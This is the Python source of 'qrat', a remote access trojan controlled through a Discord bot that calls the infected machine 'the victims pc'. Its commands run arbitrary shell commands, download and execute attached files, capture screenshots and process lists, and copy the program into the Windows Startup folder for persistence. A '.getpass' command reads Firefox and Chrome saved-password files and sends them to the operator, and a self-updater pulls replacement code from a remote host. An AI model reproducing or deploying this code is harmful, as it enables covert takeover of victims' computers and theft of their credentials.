"""https://github.com/anarix0"""
import time
import os
import json
import random
import string
import asyncio
from datetime import datetime
import shutil
import sys
import subprocess
import pyautogui
import discord
import requests
from discord.ext import commands
from discord import app_commands
if not os.path.exists(os.path.dirname(__file__)+'/files/logs'):
    os.makedirs(os.path.dirname(__file__)+'/files/logs')
logfile = os.path.dirname(__file__)+"/files/logs/log_"+datetime.now().strftime("%Y-%m-%d_%H-%M-%S")+".log"
#sys.stdout = open(logfile, 'w')
def nowdatetime():
    """Get current date and time for logs"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")+" "
WEBSITE = "https://u-qrat.anarix0.repl.co"
print(f"{nowdatetime()}[SYSTEM] starting")
print(f'{nowdatetime()}[SYSTEM] current logfile: {logfile}')
print(f'{nowdatetime()}[SYSTEM] getting directory')
print(f'{nowdatetime()}[SYSTEM] directory: {__file__}')
nointernet = True
internetcheckattempts = 0
print(f'{nowdatetime()}[SYSTEM] getting internet connection...')
while nointernet is True:
    try:
        a = requests.get(WEBSITE+"/INTERNETCHECK",timeout=1)
        if a.text == "0.7INTERNETC0NNECT":
            if internetcheckattempts != 0:
                LINE_CLEAR = '\x1b[2K' # <-- ANSI sequence
                print(end=LINE_CLEAR) # <-- clear the line where cursor is located
            print(f'{nowdatetime()}[SYSTEM] INTERNET CHECK -- successed.')
            break
        else:
            print(f'{nowdatetime()}[SYSTEM] INTERNET CHECK -- not latest.')
            break
    except Exception as internetexception:
        internetcheckattempts = internetcheckattempts+1
        print(f'{nowdatetime()}[SYSTEM] INTERNET CHECK -- failed. (x{internetcheckattempts}) [{internetexception}] ', end='\r')
        time.sleep(0.1)

try:
    REPOJSON=requests.get("https://api.github.com/repos/anarix0/qrat",timeout=9).json()
    REPOSTARS= REPOJSON["stargazers_count"]
except Exception:
    REPOSTARS = "ERROR"

with open(os.path.dirname(__file__)+'/files/config.json', 'r', encoding="utf-8") as f:
    confile = json.load(f)
VERSION = confile['ver_DO-NOT-CHANGE']
print(f"""{nowdatetime()}[SYSTEM]                        __
{nowdatetime()}[SYSTEM]   __________________ _/  |_ 
{nowdatetime()}[SYSTEM]  / ____/\\_  __ \\__  \\   __\\
{nowdatetime()}[SYSTEM] < <_|  | |  | \\// __ \\|  |  
{nowdatetime()}[SYSTEM]  \\__   | |__|  (____  /__|  
{nowdatetime()}[SYSTEM]     |__|            \\/      
{nowdatetime()}[SYSTEM] 
{nowdatetime()}[SYSTEM] made by: @anarix0
{nowdatetime()}[SYSTEM] """)
print(f'{nowdatetime()}[SYSTEM] stars: {REPOSTARS}')
try:
    UPDTIMESTART = time.perf_counter()
    print(f'{nowdatetime()}[UPDATER] checking for updates.')
    print(f'{nowdatetime()}[UPDATER] current version: {VERSION}')
    LATESTVERSION = requests.get(WEBSITE+'/latestver', timeout=10).text
    print(f'{nowdatetime()}[UPDATER] latest version: {LATESTVERSION}')
    if LATESTVERSION != VERSION:
        print(f'{nowdatetime()}[UPDATER] updating to {LATESTVERSION}.')
        print(f'{nowdatetime()}[UPDATER] getting reqfiles')
        REQFILES=requests.get(WEBSITE+'/latest/requiredfiles.txt',timeout=10).text
        for line in REQFILES.splitlines():
            if line.startswith('-R'):
                print(f'{nowdatetime()}[UPDATER] -REQUIRED {line}')
                print(f'{nowdatetime()}[UPDATER] checking {line}')
                line = line[3:]
                if not os.path.exists(line):
                    print(f'{nowdatetime()}[UPDATER] (re)creating {line}')
                if not line == "main.pyw":
                    with open(os.path.dirname(__file__)+"/files/"+line, "w", encoding="utf-8") as file:
                        print(f'{nowdatetime()}[UPDATER] getting latest info for {line}')
                        print(f'{nowdatetime()}[UPDATER] writing {line}\'s content')
                        file.write(requests.get(WEBSITE+'/latest/'+line,timeout=10).text)
                        print(f'{nowdatetime()}[UPDATER] closing {line}')
                        file.close()
                else:
                    with open(os.path.dirname(__file__)+"/main.pyw", "w", encoding="utf-8") as main:
                        print(f'{nowdatetime()}[UPDATER] getting latest info for {line}')
                        print(f'{nowdatetime()}[UPDATER] writing {line}\'s content')
                        file.write(requests.get(WEBSITE+'/latest/'+line,timeout=10).text)
                        print(f'{nowdatetime()}[UPDATER] closing {line}')
                        file.close()
            elif line.startswith('-D'):
                print(f'{nowdatetime()}[UPDATER] -DEVELOPER {line}')
                line = line.replace(line[0], "", 3)
            else:
                print(f'{nowdatetime()}[UPDATER] -OPTIONAL {line}')
        UPDTIMEEND = time.perf_counter()
        while confile['ver_DO-NOT-CHANGE'] != str(LATESTVERSION):
            print(f'{nowdatetime()}[UPDATER] attempting to change configver')
            confile['ver_DO-NOT-CHANGE'] = str(LATESTVERSION)
            with open(os.path.dirname(__file__)+'/files/config.json', 'w', encoding="utf-8") as f:
                json.dump(confile, f)
            if confile['ver_DO-NOT-CHANGE'] == str(LATESTVERSION):
                print(f'{nowdatetime()}[UPDATER] successed. {confile["ver_DO-NOT-CHANGE"]}')
            else:
                print(f'{nowdatetime()}[UPDATER] failed. still on {confile["ver"]}, retrying...')
        with open(os.path.dirname(__file__)+'/files/config.json', 'w', encoding="utf-8") as f:
            json.dump(confile, f)
        print(f'{nowdatetime()}[UPDATER] update took {UPDTIMEEND - UPDTIMESTART:0.2f}s')
    print(f'{nowdatetime()}[UPDATER] stopping updater')
except Exception as exceptionerr:
    print(f'{nowdatetime()}[UPDATER] failed. [{exceptionerr}]')
class Client(commands.Bot):
    """Main discord bot class"""
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents)
    async def setup_hook(self):
        print(f'{nowdatetime()}[DISCORD] syncing')
        await self.tree.sync(guild=discord.Object(id=confile['discord_guild_id']))
        print(f'{nowdatetime()}[DISCORD] synced!')
    async def on_ready(self):
        """When bot gets ready"""
        print(f'{nowdatetime()}[DISCORD] ready')
        await client.change_presence(status=discord.Status.do_not_disturb)
        client.loop.create_task(status_task())
async def status_task():
    """Background task"""
    while True:
        await client.change_presence(activity=discord.Game(name=f"{VERSION}"))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Activity(
          type=discord.ActivityType.watching, name=f'{os.getenv("USERNAME")}\'s pc'))
        await asyncio.sleep(10)
        await client.change_presence(activity=discord.Activity(
          type=discord.ActivityType.listening, name="issues on github."))
        await asyncio.sleep(10)

client = Client()

@client.hybrid_command(name = "cmds", description = "Commands", with_app_command = True)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def cmds(ctx):
    """Command list."""
    print(f'{nowdatetime()}[DISCORD] \'.cmds \'was run')
    embed = discord.Embed(title="Commands.",
    description="""List of commands for control.
    You can do `.cmds` later to get this sent again.""",
    colour=0x00b0f4)
    embed.add_field(name="`.cmd {value}`",
    value="Run a command in command prompt and get the output.")
    embed.add_field(name="`.ver`",
    value="Get the current and latest rat version.")
    embed.add_field(name="`.rl`",
    value="Reload the code.")
    embed.add_field(name="`.dar`",
    value="Stands for \"Download And Run\" (Requires a file, else crashes)")
    embed.add_field(name="`.ss`",
    value="Takes a screenshot and sends it into the server.")
    embed.add_field(name="`.tasklist`",
    value="Get the tasklist of the victims pc")
    embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
    embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
    await ctx.send(embed=embed)

@client.hybrid_command(name = "rl", description = "Reload", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def reload(ctx):
    """Reload"""
    print(f'{nowdatetime()}[DISCORD] \'.rl \'was run')
    print(f'{nowdatetime()}[SYSTEM] reloading')
    if not os.path.exists(os.path.dirname(__file__)+'/files/temp'):
        os.makedirs(os.path.dirname(__file__)+'/files/temp')
    print(f'{nowdatetime()}[SYSTEM] writing reloader')
    with open(os.path.dirname(__file__)+"/files/temp/reloader.py", "w") as reloaderfile:
        reloaderfile.write('''import sys
import os
import subprocess
subprocess.Popen(['python', 'main.py'])
os.remove('temp/reloader.py')
sys.exit()''')
        reloaderfile.close()
    embed = discord.Embed(title="Reloading...",colour=0x00b0f4)
    embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
    embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
    await ctx.send(embed=embed, delete_after=5)
    print(f'{nowdatetime()}[SYSTEM] starting reloader')
    subprocess.Popen(['python', os.path.dirname(__file__)+'/files/temp/reloader.py'])
    print(f'{nowdatetime()}[SYSTEM] closing')
    sys.exit()

@client.hybrid_command(name = "ss", description = "Take a screenshot", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def screenshot(ctx):
    """Screenshot"""
    print(f'{nowdatetime()}[DISCORD] \'.ss \'was run')
    errors = 1
    print(f'{nowdatetime()}[SYSTEM] attempting to create temp')
    while not os.path.exists(os.path.dirname(__file__)+'/files/temp'):
        try:
            os.makedirs(os.path.dirname(__file__)+'/files/temp')
        except Exception as tempcrerr:
            print(f'{nowdatetime()}[SYSTEM] failed. [{tempcrerr}] (x{errors})', end='\r')
            errors = errors + 1
    LINE_CLEAR = '\x1b[2K' # <-- ANSI sequence
    print(end=LINE_CLEAR) # <-- clear the line where cursor is located
    if errors == 1:
        print(f'{nowdatetime()}[SYSTEM] successed. (after {errors} attempt)')
    else:
        print(f'{nowdatetime()}[SYSTEM] successed. (after {errors} attempts)')
    SCREEN_SHOT = pyautogui.screenshot()
    SS_FILENAME = ''.join(random.choice(string.ascii_letters+string.digits) for i in range(3))
    SCREEN_SHOT.save(os.path.dirname(__file__)+f'\\files\\temp\\{SS_FILENAME}.png')
    embed = discord.Embed(title="Screenshot.", colour=0x00b0f4)
    embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
    embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
    await ctx.send(embed=embed, file=discord.File(os.path.dirname(__file__)+f'\\files\\temp\\{SS_FILENAME}.png'))
    print(f'{nowdatetime()}[SYSTEM] attempting to remove temp')
    tries = 0
    while os.path.exists(os.path.dirname(__file__)+'\\files\\temp'):
        if tries != 0:
            print(f'{nowdatetime()}[SYSTEM] failed.')
        shutil.rmtree(os.path.dirname(__file__)+'\\files\\temp')
    print(f'{nowdatetime()}[SYSTEM] successed.')

@client.hybrid_command(name = "dar", description = "Stands for \"Download and run\"", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def dar(ctx):
    """Downloads a file and runs it"""
    print(f'{nowdatetime()}[DISCORD] \'.dar \'was run')
    if not os.path.exists(os.path.dirname(__file__)+'\\files\\temp'):
        os.makedirs(os.path.dirname(__file__)+'\\files\\temp')
    if not ctx.message.attachments:
        embed = discord.Embed(title="No file.", colour=0x00b0f4)
        embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
        embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
        await ctx.send(embed=embed)
    else:
        r = requests.get(ctx.message.attachments[0].url, allow_redirects=True)
        print(f'{ctx.message.attachments[0].url}')
        print(ctx.message.attachments[0].url.split('/')[-1].split("?", 1)[0])
        path = ctx.message.attachments[0].url.split('/')[-1].split("?", 1)[0]
        with requests.get(ctx.message.attachments[0].url, stream=True) as r:
            with open(f'{os.path.dirname(__file__)}\\files\\temp/{path}', 'wb') as downloadedfile:
                downloadedfile.write(r.content)
                downloadedfile.close()
            r.close()
        print(os.path.dirname(__file__)+'\\files\\temp/'+path)
        await asyncio.sleep(3)
        os.system('start '+os.path.dirname(__file__)+'\\files\\temp/'+path)
        embed = discord.Embed(title="Running.", colour=0x00b0f4)
        embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
        embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
        await ctx.send(embed=embed)

@client.hybrid_command(name = "cmd", description = "Run a command prompt", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def cmd(ctx, *, command):
    """Run a cmd"""
    print(f'{nowdatetime()}[DISCORD] \'.cmd {command} \'was run')
    while not os.path.exists(os.path.dirname(__file__)+'\\files\\temp'):
        errors = 1
        try:
            os.makedirs(os.path.dirname(__file__)+'\\files\\temp')
        except Exception as err:
            print(f'{nowdatetime()}[SYSTEM] failed. [{err}] (x{errors})', end='\r')
            errors = errors + 1
    RANFILENAME = ''.join(random.choice(string.ascii_letters+string.digits) for i in range(3))
    os.system(command+f" > {os.path.dirname(__file__)}\\files\\temp/{RANFILENAME}.txt")
    with open(os.path.dirname(__file__)+f"\\files\\temp/{RANFILENAME}.txt", "r") as out:
        output = out.read()
    if len(output) > 2048:
        embed = discord.Embed(title="",
    description=f"Command: {command}\nOutput: *output was too big so we changed it into a file.*", colour=0x00b0f4)
        embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
        embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
        await ctx.send(embed=embed, file=discord.File(os.path.dirname(__file__)+f"\\files\\temp/{RANFILENAME}.txt"))
        os.system('taskkill /F /IM cmd.exe')
    else:
        embed = discord.Embed(title="",
    description=f"Command: {command}\nOutput:\n`{output}`", colour=0x00b0f4)
        embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
        embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
        await ctx.send(embed=embed)
        os.system('taskkill /F /IM cmd.exe')
    print(f'{nowdatetime()}[SYSTEM] attempting to remove temp')
    errors = 1
    while os.path.exists(os.path.dirname(__file__)+'\\files\\temp'):
        try:
            shutil.rmtree(os.path.dirname(__file__)+'\\files\\temp')
        except Exception as err:
            print(f'{nowdatetime()}[SYSTEM] failed. [{err}] (x{errors})', end='\r')
            #MessageBox(None, f'An error ocurred! Do me a favor and create an issue on the github page.\n[{err}]', 'https://github.com/anarix0/qrat', 0)
            errors = errors + 1
    LINE_CLEAR = '\x1b[2K' # <-- ANSI sequence
    print(end=LINE_CLEAR) # <-- clear the line where cursor is located
    if errors == 1:
        print(f'{nowdatetime()}[SYSTEM] successed. (after {errors} attempt)')
    else:
        print(f'{nowdatetime()}[SYSTEM] successed. (after {errors} attempts)')

@client.hybrid_command(name = "tasklist", description = "Get the tasklist", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def tasklist(ctx):
    """Get tasklist"""
    print(f'{nowdatetime()}[DISCORD] \'.tasklist\' was run')
    if not os.path.exists(os.path.dirname(__file__)+'\\files\\temp'):
        os.makedirs(os.path.dirname(__file__)+'\\files\\temp')
    tasklistoutput = ''.join(random.choice(string.ascii_letters+string.digits) for i in range(3))
    os.system(f"tasklist > {os.path.dirname(__file__)}\\files\\temp/tasklist-{tasklistoutput}.txt")
    embed = discord.Embed(title="Tasklist", colour=0x00b0f4)
    embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
    embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
    await ctx.send(embed=embed, file=discord.File(os.path.dirname(__file__)+f"\\files\\temp/tasklist-{tasklistoutput}.txt"))
    print(f'{nowdatetime()}[SYSTEM] attempting to remove temp')
    tries = 0
    while os.path.exists(os.path.dirname(__file__)+'\\files\\temp'):
        if tries != 0:
            print(f'{nowdatetime()}[SYSTEM] failed.')
        shutil.rmtree(os.path.dirname(__file__)+'\\files\\temp')
    print(f'{nowdatetime()}[SYSTEM] successed.')
    os.system('taskkill /F /IM cmd.exe')

@client.hybrid_command(name = "crash", description = "Crashes the program and gets log (doesnt get sent)", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def crash(ctx):
    """crashes"""
    print(f'{nowdatetime()}[DISCORD] \'.crash\' was run')
    sys.exit()

@client.hybrid_command(name = "getpass", description = "Gets browser sawed passwords", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def getpass(ctx):
    """gets passwords"""
    print(f'{nowdatetime()}[DISCORD] \'.getpass\' was run')
    user = os.getenv("USERNAME")
    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"):
        firefoxfolders = os.listdir(f'C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        print(firefoxfolders)
        print(firefoxfolders[0])
        if os.path.exists(firefoxfolders[0]+"/logins.json"):
            print('tttttttttt')
            with open(firefoxfolders[0]+"/logins.json", "r") as logins:
                passwordlist = logins.readlines()
                with open(os.path.dirname(__file__)+"\\files\\temp/firefoxpass.txt", "w") as tempfile:
                    tempfile.write(passwordlist.splitlines())
                    passwords = tempfile.read()
                    tempfile.close()
                embed = discord.Embed(title="Firefox Passwords File", description="```passwords```", colour=0x00b0f4)
                embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
                embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
                await ctx.send(embed=embed)
        else:
            print('fail')
    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"):
        print('chrome wooorororor')
        try:
            with open(f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data", "r") as logins:
                passwordlist = logins.readlines()
                with open(os.path.dirname(__file__)+"\\files\\temp/chromepass.txt", "w") as tempfile:
                    for line in passwordlist:
                        tempfile.write(passwordlist.splitlines())
                    passwords = tempfile.read()
                    tempfile.close()
                embed = discord.Embed(title="Google Chrome Passwords File", description=f"```{passwords}```", colour=0x00b0f4)
                embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
                embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
                await ctx.send(embed=embed)
        except Exception as passgeterr:
            print(f'{nowdatetime()}[SYSTEM] failed. [{passgeterr}]')
            embed = discord.Embed(title="Exception happened.", description="i already fucking told you", colour=0x00b0f4)
            embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
            embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
            await ctx.send(embed=embed)
    else:
        print('fail')

@client.hybrid_command(name = "startup", description = "Add to startup", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def startup(ctx):
    """Add to startup"""
    print(f'{nowdatetime()}[DISCORD] \'.startup\' was run')
    print(f'{nowdatetime()}[STARTUP] copying main.py')
    user = os.getenv("USERNAME")
    shutil.copyfile(os.path.dirname(__file__)+"\\main.py", f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.pyw")
    print(f'{nowdatetime()}[STARTUP] copying config.json')
    if not os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\files"):
        os.makedirs(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\files")
    shutil.copyfile(os.path.dirname(__file__)+"\\files\\config.json", f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\files\\config.json")
    embed = discord.Embed(title="Added to startup!", colour=0x00b0f4)
    embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
    embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
    await ctx.send(embed=embed, delete_after = 3)

@client.hybrid_command(name = "ver", description = "Get current ver info", with_app_command = False)
@app_commands.guilds(discord.Object(id=confile['discord_guild_id']))
async def ver(ctx):
    """Get current version"""
    print(f'{nowdatetime()}[DISCORD] \'.ver\' was run')
    LATEST_VERSION = requests.get(WEBSITE+'/latestver', timeout=10).text
    embed = discord.Embed(title="Version", description=f"""Current Version: {confile['ver_DO-NOT-CHANGE']}
Latest Version: {LATEST_VERSION}\nIf version isn't latest do `.rl`""", colour=0x00b0f4)
    embed.set_author(name="qrat", url="https://github.com/anarix0/qrat")
    embed.set_footer(text="https://dsc.gg/void0 | https://github.com/anarix0/qrat")
    await ctx.send(embed=embed)
    os.system('taskkill /F /IM cmd.exe')

client.run(confile['discord_token'])
